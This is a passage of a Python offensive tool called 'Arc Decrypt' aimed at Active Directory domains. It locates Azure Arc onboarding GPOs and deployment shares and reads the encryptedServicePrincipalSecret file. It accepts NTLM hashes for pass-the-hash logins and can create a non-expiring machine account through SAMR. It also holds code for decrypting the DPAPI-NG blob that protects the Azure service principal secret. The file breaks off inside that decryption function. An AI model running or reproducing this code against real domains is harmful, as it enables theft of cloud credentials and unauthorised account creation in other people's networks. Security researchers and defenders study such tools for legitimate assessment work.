#!/usr/bin/env python3

import argparse
import base64
import contextlib
import io
import json
import os
import random
import re
import socket
import string
import sys
import traceback

try:
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
    HAS_LDAP3 = True
except ImportError:
    HAS_LDAP3 = False

try:
    from impacket.smbconnection import SMBConnection
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

ARC_FILE_INDICATORS = [
    "encryptedServicePrincipalSecret",
    "ArcInfo.json",
    "AzureArcDeployment.psm1",
    "EnableAzureArc.ps1",
]
ARC_GPO_KEYWORDS = ["azure arc", "azurearc", "arc server", "arc onboard"]

_NTLM_HASH_RE = re.compile(r'^(?:[a-fA-F0-9]{32}:)?[a-fA-F0-9]{32}$')
_DUMMY_LM = "aad3b435b51404eeaad3b435b51404ee"


def _split_hash(password):
    """If password is 'LM:NT' or bare 'NT' (hex), return (lm_hex, nt_hex). Else (None, None)."""
    if password and _NTLM_HASH_RE.match(password):
        if ':' in password:
            lm, nt = password.split(':', 1)
        else:
            lm, nt = _DUMMY_LM, password
        return lm, nt
    return None, None


def _normalize_hash(h):
    """Normalize a hash to 'LM:NT' format so ldap3 and spnego auto-detect it.

    Both libraries only recognize 'LM:NT' (32:32 hex with colon) — a bare NT
    hash (32 hex, no colon) is treated as a plaintext password. impacket's
    _split_hash handles both, but the raw password string flows unmodified
    to ldap3/spnego, so we normalize here.
    """
    if not h:
        return ""
    if ':' not in h and re.match(r'^[a-fA-F0-9]{32}$', h):
        return f"{_DUMMY_LM}:{h}"
    return h


YELLOW = "\033[93m"
GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"
DIM    = "\033[2m"


def banner():
    print(f"""{CYAN}{BOLD}
╔══════════════════════════════════════════════════╗
║                    Arc Decrypt                   ║
╚══════════════════════════════════════════════════╝{RESET}
""")

def _good(msg): return f"{GREEN}[+]{RESET} {msg}"
def _warn(msg): return f"{YELLOW}[!]{RESET} {msg}"
def _bad(msg):  return f"{RED}[-]{RESET} {msg}"
def _info(msg): return f"{CYAN}[*]{RESET} {msg}"

CONFIG = {"verbose": False}

def pline(prefix, status_fn, msg):
    print(f"  {BOLD}{prefix}:{RESET} {status_fn(msg)}")

def dbg(prefix, status_fn, msg):
    """Like pline, but only prints when -v/--verbose is set."""
    if CONFIG["verbose"]:
        pline(prefix, status_fn, msg)

def section(msg):
    print(f"\n{BOLD}{msg}{RESET}\n{'─'*50}")

# SMB helper
def smb_connect(hostname, domain, username, password, fallback_ip=None):
    """
    Return an authenticated SMBConnection or None.
    Tries hostname first, then fallback_ip if hostname won't resolve.
    remoteName is always hostname (for NTLM); remoteHost is what we connect to.
    """
    targets = [hostname]
    if fallback_ip and fallback_ip != hostname:
        targets.append(fallback_ip)

    for target in targets:
        try:
            dbg("SMB", _info, f"Connecting to {target} (remoteName={hostname}) ...")
            smb = SMBConnection(hostname, target, timeout=5)
            if username and password:
                lm, nt = _split_hash(password)
                if lm:
                    dbg("SMB", _info, f"Authenticating as {domain}\\{username} with NTLM hash")
                    smb.login(username, "", domain, lmhash=lm, nthash=nt)
                else:
                    dbg("SMB", _info, f"Authenticating as {domain}\\{username} with password")
                    smb.login(username, password, domain)
            else:
                dbg("SMB", _info, "Authenticating with null/kerberos session")
                try:
                    smb.kerberosLogin("", "", domain)
                except Exception:
                    smb.login("", "")
            dbg("SMB", _good, f"Connected to {target}")
            return smb
        except Exception as e:
            dbg("SMB", _bad, f"Connection to {target} failed: {e}")
    return None


# LDAP + SYSVOL-over-SMB

def _walk_sysvol(smb, guid, gpo_base=None, base_share="SYSVOL"):
    """Recursively list the GPO directory tree over SMB and print every path."""
    print(f"\n  {BOLD}SYSVOL tree for GPO {guid}:{RESET}")
    root = gpo_base or f"Policies\\{guid}"

    def _recurse(path, depth=0):
        try:
            entries = smb.listPath(base_share, path + "\\*")
        except Exception as e:
            print(f"  {'  '*depth}{DIM}[err listing {path}: {e}]{RESET}")
            return
        for entry in entries:
            name = entry.get_longname()
            if name in (".", ".."):
                continue
            full = f"{path}\\{name}"
            indent = "  " * (depth + 1)
            if entry.is_directory():
                print(f"  {indent}{CYAN}{name}/{RESET}")
                _recurse(full, depth + 1)
            else:
                size = entry.get_filesize()
                print(f"  {indent}{name}  {DIM}({size} bytes){RESET}")

    _recurse(root)
    print()

def _ldap_connect(dc, domain, username, password, prefix="LDAP"):
    """Bind to LDAP on dc as domain\\username (NTLM) or GSSAPI (null creds).

    Returns a Connection or None on bind failure (caller handles return).
    """
    srv = Server(dc, get_info=ALL, connect_timeout=5)
    try:
        if username and password:
            dbg(prefix, _info, f"Binding as {domain}\\{username} (NTLM)")
            return Connection(
                srv,
                user=f"{domain}\\{username}",
                password=password,
                authentication=NTLM,
                auto_bind=True,
                auto_referrals=False,
            )
        dbg(prefix, _info, "Binding with GSSAPI")
        return Connection(srv, authentication="GSSAPI",
                          auto_bind=True, auto_referrals=False)
    except Exception as e:
        pline(prefix, _bad, f"LDAP bind failed: {e}")
        return None


def enumerate_dcs(dc, domain, username, password):
    """
    Query LDAP for all Domain Controller hostnames in the domain.
    Falls back to [dc] on any failure.
    """
    if not HAS_LDAP3:
        dbg("LDAP", _warn, "ldap3 not installed - cannot enumerate DCs")
        return [dc]

    base_dn = "DC=" + domain.replace(".", ",DC=")
    dbg("LDAP", _info, f"Enumerating DCs via LDAP ({dc}) ...")
    conn = _ldap_connect(dc, domain, username, password, prefix="LDAP")
    if conn is None:
        return [dc]

    dc_list = []
    conn.search(
        f"OU=Domain Controllers,{base_dn}",
        "(objectClass=computer)",
        search_scope=SUBTREE,
        attributes=["dNSHostName"],
    )
    for entry in conn.entries:
        dc_list.append(str(entry.dNSHostName))
    conn.unbind()

    if not dc_list:
        pline("LDAP", _warn, f"No DCs found via LDAP - using {dc}")
        return [dc]
    dbg("LDAP", _good, f"Found {len(dc_list)} DC(s): {', '.join(dc_list)}")
    return dc_list


# SYSVOL files we look for, in order, under each GPO base directory.
_SYSVOL_CANDIDATE_PATHS = [
    "Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
    "Machine\\Scripts\\scripts.ini",
    "Machine\\Scripts\\Startup\\EnableAzureArc.ps1",
    "GPT.INI",
]


def _share_entry(server, share, unc, report_server, share_name):
    """Build a share-info dict (see check_gpo_and_sysvol return shape)."""
    return {
        "server":        server,
        "share":         share,
        "unc":           unc,
        "report_server": report_server,
        "share_name":    share_name,
    }


def _read_sysvol_file(smb, gpo_base):
    """Try candidate SYSVOL paths under gpo_base; return first readable file's
    decoded content, or None if none could be read."""
    for suffix in _SYSVOL_CANDIDATE_PATHS:
        candidate = f"{gpo_base}\\{suffix}"
        try:
            dbg("GPO", _info, f"Trying SYSVOL path: {candidate}")
            buf = io.BytesIO()
            smb.getFile("SYSVOL", candidate, buf.write)
            content = buf.getvalue().decode("utf-8", errors="ignore")
            dbg("GPO", _good, f"Read {len(content)} bytes from {candidate}")
            return content
        except Exception:
            pass
    return None


def _extract_shares_from_xml(xml_content, extracted_shares):
    """Parse share references from a GPO XML/ini file; append any new shares
    to `extracted_shares` (a dict keyed by lowercased UNC, deduped in place)."""
    dbg("GPO", _info, "Parsing XML for share references ...")
    unc_matches = re.findall(
        r"['\"]?(\\\\[^\\]+\\[^\\\s'\"<&]+)['\"]?",
        xml_content,
    )
    report_server = (re.findall(r"-ReportServerFQDN\s+([^\s'\"<&]+)", xml_content) or [""])[0]
    share_name    = (re.findall(r"-ArcRemoteShare\s+['\"]?([^\s'\"<&]+)", xml_content) or [""])[0]

    for unc in unc_matches:
        # extract server and first share component from UNC
        parts = unc.lstrip("\\").split("\\")
        if len(parts) >= 2:
            srv_name, share_part = parts[0], parts[1]
            clean_unc = f"\\\\{srv_name}\\{share_part}"
            if clean_unc.lower() not in extracted_shares:
                extracted_shares[clean_unc.lower()] = _share_entry(
                    srv_name, share_part, clean_unc,
                    report_server or srv_name, share_name or share_part,
                )
                pline("GPO", _good, f"Share extracted from SYSVOL XML: {clean_unc}")
            break  # one per GPO is enough

    # BUG: `not extracted_shares` checks the global dict accumulated across all
    # GPOs, not whether *this* GPO matched the UNC regex above. If GPO #1
    # matched via the regex, GPO #2's -ReportServerFQDN fallback never fires.
    # Should be a per-GPO flag (e.g. `if not gpo_found_share and ...`).
    if not extracted_shares and report_server and share_name:
        clean_unc = f"\\\\{report_server}\\{share_name}"
        if clean_unc.lower() not in extracted_shares:
            extracted_shares[clean_unc.lower()] = _share_entry(
                report_server, share_name, clean_unc,
                report_server, share_name,
            )
            pline("GPO", _good, f"Share extracted from SYSVOL XML (-ArcRemoteShare): {clean_unc}")


def check_gpo_and_sysvol(dc, domain, username, password, debug_sysvol=False):
    """
    1. LDAP - find Arc onboarding GPO, get its SYSVOL path and GUID
    2. SMB  - read ScheduledTasks.xml from SYSVOL over SMB
    3. Parse XML to extract exact share server + share name + UNC
    Returns (gpos, dc_list, extracted_shares)
      extracted_shares: list of dicts {server, share, unc, report_server}
    """
    gpos            = []
    dc_list         = []
    extracted_shares = {}

    if not HAS_LDAP3:
        pline("GPO", _warn, "ldap3 not installed - skipping (pip install ldap3)")
        return gpos, dc_list, extracted_shares

    base_dn = "DC=" + domain.replace(".", ",DC=")
    dbg("GPO", _info, f"LDAP base DN: {base_dn}")
    conn = _ldap_connect(dc, domain, username, password, prefix="GPO")
    if conn is None:
        return gpos, dc_list, extracted_shares

    # GPO search
    dbg("GPO", _info, f"Searching for Arc GPOs in CN=Policies,CN=System,{base_dn} ...")
    ok = conn.search(
        f"CN=Policies,CN=System,{base_dn}",
        "(objectClass=groupPolicyContainer)",
        search_scope=SUBTREE,
        attributes=["displayName", "gPCFileSysPath", "distinguishedName"],
    )
    if not ok:
        pline("GPO", _warn,
              f"LDAP search failed - wrong domain? "
              f"({conn.result.get('message','').strip()[:80]})")
        return gpos, dc_list, extracted_shares

    for entry in conn.entries:
        raw_name = str(entry.displayName)
        if any(kw in raw_name.lower() for kw in ARC_GPO_KEYWORDS):
            sysvol_path = str(entry.gPCFileSysPath)
            gpos.append({
                "name":   raw_name,
                "sysvol": sysvol_path,
                "dn":     str(entry.distinguishedName),
            })
            pline("GPO", _good, f"Arc GPO found: {raw_name}")
            print(f"       {DIM}* SYSVOL: {sysvol_path}{RESET}")
        else:
            dbg("GPO", _info, f"Skipping non-Arc GPO: {raw_name}")

    if not gpos:
        pline("GPO", _bad, "No Arc-related GPOs found in LDAP")

    # Get DCs
    dbg("GPO", _info, "Enumerating Domain Controllers ...")
    conn.search(
        f"OU=Domain Controllers,{base_dn}",
        "(objectClass=computer)",
        search_scope=SUBTREE,
        attributes=["dNSHostName"],
    )
    for entry in conn.entries:
        dc_list.append(str(entry.dNSHostName))
    conn.unbind()
    dbg("GPO", _good, f"Found {len(dc_list)} DC(s): {', '.join(dc_list) if dc_list else 'none'}")

    if not gpos:
        return gpos, dc_list, extracted_shares

    # Read ScheduledTasks.xml from SYSVOL over SMB
    if not HAS_IMPACKET:
        pline("GPO", _warn, "impacket not installed - cannot read SYSVOL over SMB")
        return gpos, dc_list, extracted_shares

    sysvol_dc = dc_list[0] if dc_list else dc
    dbg("GPO", _info, f"Reading SYSVOL from {sysvol_dc} over SMB ...")
    smb = smb_connect(sysvol_dc, domain, username, password,
                      fallback_ip=dc)
    if smb is None:
        pline("GPO", _warn, "Could not connect to DC over SMB to read SYSVOL")
        return gpos, dc_list, extracted_shares

    for gpo in gpos:
        sysvol = gpo["sysvol"]
        guid_match = re.search(r'\{[A-Fa-f0-9\-]{36}\}', sysvol)
        if not guid_match:
            pline("GPO", _warn, f"Could not extract GUID from SYSVOL path: {sysvol}")
            continue
        guid = guid_match.group(0)
        dbg("GPO", _info, f"Processing GPO {guid} ...")

        # everything after "\sysvol\" is the GPO base path on the share
        gpo_base = re.sub(r"^\\\\[^\\]+\\sysvol\\", "", sysvol, flags=re.IGNORECASE)

        xml_content = _read_sysvol_file(smb, gpo_base)
        if xml_content is None:
            pline("GPO", _warn, f"Could not find task XML in SYSVOL for GPO {guid}")
            if debug_sysvol:
                _walk_sysvol(smb, guid, gpo_base=gpo_base)
            else:
                pline("GPO", _warn, "Run with --debug-sysvol to see full GPO directory tree")
            continue

        _extract_shares_from_xml(xml_content, extracted_shares)

    smb.logoff()
    return gpos, dc_list, list(extracted_shares.values())


def check_share(share_info, domain, username, password, fallback_ip=None):
    """
    Connect to the specific share identified from SYSVOL and confirm
    deployment files are present.
    Returns detail dict or None.
    """
    server     = share_info["server"]
    share_name = share_info["share"]
    unc        = share_info["unc"]

    dbg("SMB", _info, f"Probing share {unc} ...")
    smb = smb_connect(server, domain, username, password, fallback_ip=fallback_ip)
    if smb is None:
        # if server FQDN doesn't resolve, try fallback IP with server name for NTLM
        pline("SMB", _bad, f"Could not connect to {server}")
        return None

    pline("SMB", _good, f"Connected to share: {unc}")

    detail = {"unc": unc, "subdirs": [], "access_denied": False}
    subdirs = ["AzureArcDeploy", "ArcDeploy", ""]

    for sub in subdirs:
        pattern = f"{sub}\\*" if sub else "*"
        try:
            files      = smb.listPath(share_name, pattern)
            names      = [f.get_longname() for f in files
                          if f.get_longname() not in (".", "..")]
            indicators = [n for n in names if n in ARC_FILE_INDICATORS]
            if names:
                detail["subdirs"].append({
                    "path":       f"{unc}\\{sub}" if sub else unc,
                    "indicators": indicators,
                    "all_files":  names,
                })
            if indicators:
                dbg("SMB", _good, f"Arc indicators found in {sub or 'root'}: {', '.join(indicators)}")
            elif names:
                dbg("SMB", _info, f"No Arc indicators in {sub or 'root'} ({len(names)} files)")
        except Exception as e:
            if "STATUS_ACCESS_DENIED" in str(e):
                detail["access_denied"] = True
                dbg("SMB", _warn, f"Access denied listing {sub or 'root'}")

    smb.logoff()
    # return detail even if empty - share was found, just may be unreadable
    return detail


# ── fallback: SMB keyword share hunt (if GPO parse fails) ────────────────────
ARC_SHARE_KEYWORDS = ["arc", "azurearc", "arcshare", "arconboard", "arcdeploy"]

def check_smb_shares_fallback(dc_list, domain, username, password, fallback_ip=None):
    """Enumerate all shares on DCs and filter by keyword - used if SYSVOL parse fails."""
    if not HAS_IMPACKET:
        return [], []

    found_shares  = []
    share_details = []

    dbg("SMB", _info, f"Scanning {len(dc_list)} DC(s) for Arc shares ...")
    for dc in dc_list:
        dbg("SMB", _info, f"Connecting to {dc} ...")
        smb = smb_connect(dc, domain, username, password, fallback_ip=fallback_ip)
        if smb is None:
            pline("SMB", _bad, f"Could not connect to {dc}")
            continue

        try:
            shares = smb.listShares()
        except Exception as e:
            pline("SMB", _bad, f"Could not list shares on {dc}: {e}")
            smb.logoff()
            continue

        dbg("SMB", _info, f"{dc} has {len(shares)} share(s) - checking keywords ...")

        for share in shares:
            name = share["shi1_netname"].rstrip("\x00")
            unc  = f"\\\\{dc}\\{name}"
            if any(kw in name.lower() for kw in ARC_SHARE_KEYWORDS):
                pline("SMB", _good, f"Arc-related share (keyword match): {unc}")
                found_shares.append(unc)
                detail = check_share(
                    {"server": dc, "share": name, "unc": unc},
                    domain, username, password, fallback_ip=fallback_ip
                )
                if detail:
                    share_details.append(detail)

        smb.logoff()

    if not found_shares:
        pline("SMB", _bad, "No Arc deployment shares found")
    return found_shares, share_details


def resolve_dc(domain):
    try:
        dbg("DNS", _info, f"Resolving DC for {domain} ...")
        ip = socket.gethostbyname(domain)
        if not HAS_DNS:
            dbg("DNS", _warn, f"SRV lookup failed - using A record {ip}")
            return ip
        dbg("DNS", _info, f"Querying SRV _ldap._tcp.dc._msdcs.{domain} ...")
        try:
            ans = dns.resolver.resolve(f"_ldap._tcp.dc._msdcs.{domain}", "SRV")
            dc = str(ans[0].target).rstrip(".")
            dbg("DNS", _good, f"SRV resolved to {dc}")
            return dc
        except Exception:
            dbg("DNS", _warn, f"SRV lookup failed - using A record {ip}")
            return ip
    except Exception:
        return None


def main():
    parser = argparse.ArgumentParser(
        description="Azure Arc misconfiguration detector"
    )
    
    # Parent parser for shared arguments
    parent = argparse.ArgumentParser(add_help=False)
    parent.add_argument("-d",     metavar="DOMAIN",   required=True,
                        help="Domain FQDN e.g. contoso.local")
    parent.add_argument("-dc-ip", metavar="DC",       default="",
                        help="DC FQDN or IP (e.g. DC01.contoso.local or 10.0.0.1)")
    parent.add_argument("-u",     metavar="USERNAME", default="",
                        help="Domain user (or machine account for decrypt)")
    _auth_grp = parent.add_mutually_exclusive_group(required=False)
    _auth_grp.add_argument("-p", metavar="PASSWORD", default="",
                           help="Password")
    _auth_grp.add_argument("-H", "-hash", dest="hash", metavar="LM:NT", default="",
                           help="NTLM hash (LM:NT or bare NT hex)")
    parent.add_argument("-v", "-verbose", dest="verbose", action="store_true",
                        help="Show every step in detail")

    sub = parser.add_subparsers(dest="command", metavar="COMMAND")
    sub.required = True

    p_find = sub.add_parser("find", parents=[parent], help="Detect Arc GPO and deployment share")
    p_find.add_argument("-debug-sysvol", action="store_true",
                        help="Walk and print the full GPO SYSVOL directory tree")
    p_find.add_argument("--gpo", action="store_true",
                        help="Only use GPO/SYSVOL detection")
    p_find.add_argument("--smb", action="store_true",
                        help="Only use SMB keyword share enumeration")

    p_dec = sub.add_parser(
        "decrypt",
        parents=[parent],
        help="Decrypt encryptedServicePrincipalSecret using a machine account",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="""
Auth modes (pick one):
  -auto -u USER -p PASS     Create a temp machine account using domain user creds
  -auto -u USER -H LM:NT    Same, authenticating with an NTLM hash
  -u MACHINE$ -p PASS       Explicit machine account credentials (NTLM)
  -u MACHINE$ -H LM:NT      Same, authenticating with an NTLM hash

If -share is omitted, the Arc share is auto-discovered via GPO/SYSVOL.
        """
    )
    p_dec.add_argument("-share",  metavar="UNC",      default="",
                       help=r"Share UNC e.g. \DC01.constoso.local\ArcShare (auto-discovered if omitted)")

    # auth modes (-auto is mutually exclusive with standalone -u)
    auth_grp = p_dec.add_mutually_exclusive_group(required=False)
    auth_grp.add_argument("-auto",   action="store_true",
                          help="Auto-create machine account (needs -u domain_user -p password)")

    p_dec.add_argument("-dump-blob", metavar="PATH",
                       help="Save the decoded blob to PATH for offline analysis")

    args = parser.parse_args()

    CONFIG["verbose"] = getattr(args, "verbose", False)

    if args.command == "decrypt":
        cmd_decrypt(args)
        return

    banner()

    domain = args.d or os.environ.get("USERDNSDOMAIN", "").lower()
    if not domain:
        print(_bad("Could not auto-detect domain. Pass -d <fqdn>"))
        sys.exit(1)

    dc = getattr(args, "dc_ip", "") or ""
    if not dc:
        dc = resolve_dc(domain)
        if not dc:
            print(_bad(f"Could not resolve a DC for {domain}. Pass -dc-ip <fqdn or ip>"))
            sys.exit(1)

    username = args.u
    password = args.p or _normalize_hash(args.hash)

    print(f"  {_info(f'Domain : {domain}')}")
    print(f"  {_info(f'DC     : {dc}')}")
    print(f"  {_info(f'User   : {domain}\\{username}' if username else 'User   : null session')}")
   
    arc_in_use    = False
    share_details = []
    extracted     = []   # shares parsed from SYSVOL
    gpos          = []
    dc_list       = []

    use_gpo  = getattr(args, "gpo", False)
    use_smb  = getattr(args, "smb", False)
    auto_mode = not use_gpo and not use_smb

    if auto_mode:
        dbg("FIND", _info, "Discovery mode: auto (GPO first, SMB fallback)")
    elif use_gpo and use_smb:
        dbg("FIND", _info, "Discovery mode: both (GPO + SMB independently)")
    elif use_gpo:
        dbg("FIND", _info, "Discovery mode: GPO only")
    elif use_smb:
        dbg("FIND", _info, "Discovery mode: SMB only")

    # 1. GPO + SYSVOL parse
    if use_gpo or auto_mode:
        section("GPO Detection")
        debug_sysvol = getattr(args, "debug_sysvol", False)
        gpos, dc_list, extracted = check_gpo_and_sysvol(
            dc, domain, username or None, password or None,
            debug_sysvol=debug_sysvol
        )
        if gpos:
            arc_in_use = True

        # Probe shares identified from SYSVOL XML (precise)
        if extracted:
            section("Share Probe")
            dbg("FIND", _info, f"Probing {len(extracted)} share(s) from GPO ...")
            for share_info in extracted:
                detail = check_share(
                    share_info, domain, username or None, password or None,
                    fallback_ip=dc
                )
                if detail is not None:
                    arc_in_use = True
                    share_details.append(detail)

    # 2. Keyword-based share hunt
    #    auto_mode: only if GPO SYSVOL parse found nothing (current fallback)
    #    use_smb:   always (explicitly requested)
    if (use_smb or (auto_mode and not extracted)) and HAS_IMPACKET:
        section("SMB Share Scan")
        if not dc_list:
            dbg("SMB", _info, "No DC list yet - enumerating via LDAP ...")
            dc_list = enumerate_dcs(dc, domain, username or None, password or None)
        _, fb_details = check_smb_shares_fallback(
            dc_list, domain, username or None, password or None, fallback_ip=dc
        )
        if fb_details:
            arc_in_use = True
            share_details.extend(fb_details)

    section("Summary")

    if gpos or share_details or arc_in_use:
        print(f"  {_good(f'Azure Arc IS in use on {domain}')}")
    else:
        print(f"  {_bad(f'No evidence of Azure Arc found on {domain}')}")

    if gpos:
        print()
        print(f"  {_good('GPO(s) detected:')}")
        for g in gpos:
            print(f"    {BOLD}{g['name']}{RESET}")
            print(f"      SYSVOL : {g['sysvol']}")

    if share_details:
        print()
        print(f"  {_good('Deployment share(s) found:')}")
        for detail in share_details:
            if detail.get("access_denied") and not detail["subdirs"]:
                print(f"\n    {_warn(f'Share identified but access denied: {detail["unc"]}')} ")
                print(f"      {DIM}(share exists - contents protected by permissions){RESET}")
                continue
            for sub in detail["subdirs"]:
                if sub["indicators"]:
                    print(f"\n    {_good('Deployment files confirmed in')} "
                          f"{BOLD}{sub['path']}{RESET}")
                    for f in sub["indicators"]:
                        print(f"      {_good(f)}")
                elif sub["all_files"]:
                    print(f"\n    {_info(sub['path'])}")
                    for f in sub["all_files"]:
                        print(f"      {DIM}{f}{RESET}")

    print()


# DECRYPT SUBCOMMAND

def _der_tlv(data, pos=0):
    """Parse one DER TLV. Returns (tag_byte, value_bytes, next_pos)."""
    t = data[pos]; pos += 1
    lb = data[pos]; pos += 1
    if lb & 0x80:
        n = lb & 0x7f
        ln = int.from_bytes(data[pos:pos+n], "big"); pos += n
    else:
        ln = lb
    return t, data[pos:pos+ln], pos+ln

def _der_children(data):
    items, pos = [], 0
    while pos < len(data):
        t, v, pos = _der_tlv(data, pos)
        items.append((t, v))
    return items

def _decode_oid(ob):
    parts = [ob[0] // 40, ob[0] % 40]
    val = 0
    for b in ob[1:]:
        val = (val << 7) | (b & 0x7f)
        if not (b & 0x80):
            parts.append(val); val = 0
    return ".".join(map(str, parts))

def _asn1_first_oid(data: bytes):
    """Return the first OID string from a DER-encoded blob, or None."""
    try:
        if data[0] != 0x30:
            return None
        _, seq_val, _ = _der_tlv(data)
        ch = _der_children(seq_val)
        if ch and ch[0][0] == 0x06:
            return _decode_oid(ch[0][1])
    except Exception:
        pass
    return None



def _create_machine_account(domain, dc, user_username, user_password, machine_name=None):
    """
    Create a temporary machine account via SAMR (native AD protocol).
    Returns (machine_name, machine_password) or raises on failure.

    If no name is given, generates one as  computer-<4 random chars>.
    """
    from impacket.dcerpc.v5 import transport, samr

    machine_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=20)) + "Aa1!"
    if machine_name is None:
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        machine_name = f"computer-{rand}"
    machine_name = machine_name.rstrip("$") + "$"

    pline("AUTO", _info, f"Creating machine account ...")

    string_binding = f"ncacn_np:{dc}[\\pipe\\samr]"
    dbg("AUTO", _info, f"SAMR binding: {string_binding}")
    rpctransport = transport.DCERPCTransportFactory(string_binding)
    lm, nt = _split_hash(user_password)
    if lm:
        dbg("AUTO", _info, f"Authenticating as {domain}\\{user_username} with NTLM hash")
        rpctransport.set_credentials(user_username, "", domain, lm, nt, "", None)
    else:
        dbg("AUTO", _info, f"Authenticating as {domain}\\{user_username} with password")
        rpctransport.set_credentials(user_username, user_password, domain, "", "", None)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)
    dbg("AUTO", _good, "SAMR connected and bound")

    resp         = samr.hSamrConnect(dce)
    server_handle = resp["ServerHandle"]
    dbg("AUTO", _info, "SamrConnect OK")

    # find the domain (exclude BUILTIN)
    resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
    domain_name = next(
        d["Name"] for d in resp2["Buffer"]["Buffer"]
        if d["Name"].upper() != "BUILTIN"
    )
    resp3        = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain_name)
    domain_sid   = resp3["DomainId"]
    resp4        = samr.hSamrOpenDomain(dce, server_handle,
                                       samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER,
                                       domainId=domain_sid)
    domain_handle = resp4["DomainHandle"]
    dbg("AUTO", _info, f"Domain: {domain_name} (SID: {domain_sid.formatCanonical()})")

    resp5 = samr.hSamrCreateUser2InDomain(
        dce, domain_handle, machine_name,
        samr.USER_WORKSTATION_TRUST_ACCOUNT,
        samr.USER_FORCE_PASSWORD_CHANGE,
    )
    user_handle = resp5["UserHandle"]
    dbg("AUTO", _good, f"Created account {machine_name}")

    samr.hSamrSetPasswordInternal4New(dce, user_handle, machine_pass)
    dbg("AUTO", _info, "Machine password set")

    checkForUser = samr.hSamrLookupNamesInDomain(dce, domain_handle, [machine_name])
    user_rid = checkForUser['RelativeIds']['Element'][0]
    openUser = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, user_rid)
    mod_user_handle = openUser['UserHandle']

    req = samr.SAMPR_USER_INFO_BUFFER()
    req['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
    req['Control']['UserAccountControl'] = samr.USER_WORKSTATION_TRUST_ACCOUNT | samr.USER_DONT_EXPIRE_PASSWORD
    samr.hSamrSetInformationUser2(dce, mod_user_handle, req)
    
    samr.hSamrCloseHandle(dce, mod_user_handle)

    samr.hSamrCloseHandle(dce, user_handle)
    samr.hSamrCloseHandle(dce, domain_handle)
    samr.hSamrCloseHandle(dce, server_handle)
    dce.disconnect()

    pline("AUTO", _good, f"Machine account created: {machine_name}")
    pline("AUTO", _good, f"Machine account password: {machine_pass}")
    return machine_name, machine_pass


def decode_pwsh_bytes(raw: bytes) -> str:
    """Decode bytes written by PowerShell, detecting UTF-16 LE/BE or UTF-8 BOMs."""
    if raw.startswith(b"\xff\xfe"):
        return raw[2:].decode("utf-16-le", errors="ignore").strip()
    if raw.startswith(b"\xfe\xff"):
        return raw[2:].decode("utf-16-be", errors="ignore").strip()
    if raw.startswith(b"\xef\xbb\xbf"):
        return raw[3:].decode("utf-8", errors="ignore").strip()
    return raw.decode("utf-8", errors="ignore").strip()


def _read_share_files(smb, share_name):
    """Read deployment files from share. Returns (secret_raw, arcinfo_str, psm1_str)."""
    secret_raw   = None
    arcinfo_str  = None
    psm1_str     = None

    targets = [
        ("encryptedServicePrincipalSecret", "secret"),
        ("ArcInfo.json",                    "arcinfo"),
        ("AzureArcDeployment.psm1",         "psm1"),
    ]

    for subdir in ["AzureArcDeploy", "ArcDeploy", ""]:
        prefix = (subdir + "\\") if subdir else ""
        for fname, var in targets:
            already = {"secret": secret_raw, "arcinfo": arcinfo_str, "psm1": psm1_str}
            if already[var] is not None:
                continue
            try:
                dbg("SMB", _info, f"Trying {prefix}{fname} ...")
                buf = io.BytesIO()
                smb.getFile(share_name, f"{prefix}{fname}", buf.write)
                raw = buf.getvalue()
                if var == "secret":
                    secret_raw  = raw
                    pline("SMB", _good, f"Read encryptedServicePrincipalSecret ({subdir or 'root'})")
                elif var == "arcinfo":
                    arcinfo_str = decode_pwsh_bytes(raw)
                    dbg("SMB", _good, f"Read ArcInfo.json ({subdir or 'root'}) - {len(raw)} bytes")
                else:
                    psm1_str = decode_pwsh_bytes(raw)
                    dbg("SMB", _good, f"Read AzureArcDeployment.psm1 ({subdir or 'root'}) - {len(raw)} bytes")
            except Exception:
                pass

    return secret_raw, arcinfo_str, psm1_str


def _unprotect_dpapi_ng(blob, *, server, username=None, password=None,
                        auth_protocol="negotiate"):
    """
    Decrypt a DPAPI-NG (NCryptProtectSecret) blob, supporting blobs with
    MORE THAN ONE recipient.

    Azure Arc protects encryptedServicePrincipalSecret to a protection
    descriptor that can expand to multiple SIDs, producing a CMS EnvelopedData
    with several KEKRecipientInfo entries.  dpapi-ng 0.2.0's DPAPINGBlob.unpack
    hard-requires exactly one recipient and raises
    "DPAPI-NG blob is not in the expected format" otherwise.

    We parse the EnvelopedData ourselves, build a single-recipient DPAPINGBlob
    for each KEKRecipientInfo, and try each one against GKDI until one's group
    key unwraps the CEK.  Returns (plaintext_bytes, recipient_index).
    """
    from dpapi_ng._asn1 import ASN1Reader
    from dpapi_ng._pkcs7 import ContentInfo, EnvelopedData
    from dpapi_ng._blob import DPAPINGBlob, KeyIdentifier, ProtectionDescriptor
    from dpapi_ng._client import KeyCache, _sync_get_key, _decrypt_blob
    from dpapi_ng._dns import lookup_dc

    view = memoryview(blob)
    header = ASN1Reader(view).peek_header()
    ci = ContentInfo.unpack(view[: header.tag_length + header.length], header=header)
    remaining = view[header.tag_length + header.length:]

    if ci.content_type != EnvelopedData.CONTENT_TYPE_ENVELOPED_DATA_OID:
        raise ValueError(f"Unsupported content type {ci.content_type}")

    ed = EnvelopedData.unpack(ci.content)
    eci = ed.encrypted_content_info
    enc_content = eci.content or remaining.tobytes()

    recipients = []
    for ri in ed.recipient_infos:
        other = getattr(getattr(ri, "kekid", None), "other", None)
        if not other or other.key_attr_id != DPAPINGBlob.MICROSOFT_SOFTWARE_OID:
            continue
        recipients.append(DPAPINGBlob(
            key_identifier        = KeyIdentifier.unpack(ri.kekid.key_identifier),
            protection_descriptor = ProtectionDescriptor.unpack(other.key_attr or b""),
            enc_cek               = ri.encrypted_key,
            enc_cek_algorithm     = ri.key_encryption_algorithm.algorithm,
